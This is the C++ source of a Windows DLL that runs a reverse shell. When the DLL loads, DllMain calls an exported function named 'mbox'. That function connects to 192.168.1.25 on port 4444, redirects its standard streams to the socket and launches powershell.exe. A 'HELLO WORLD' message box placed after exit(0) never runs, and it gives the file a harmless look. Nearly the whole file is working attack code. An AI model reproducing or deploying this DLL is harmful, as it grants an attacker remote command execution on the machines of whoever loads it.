#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

using namespace std;

#ifdef __cplusplus   
extern "C" {         
#endif
 
__declspec(dllexport) int __cdecl mbox(LPCWSTR msg){
    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    char *ip = "192.168.1.25";
    short port = 4444;

    // init socket lib
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);

    // connect to remote host
    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    // start cmd.exe with redirected streams
    CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    exit(0);

    MessageBox(NULL, TEXT("HELLO WORLD"), TEXT("TEST"), MB_OK);
    return 1;
}   
 
#ifdef __cplusplus
}
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){
    switch(fdwReason){ 
        case DLL_PROCESS_ATTACH:
            mbox(L"Run");
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}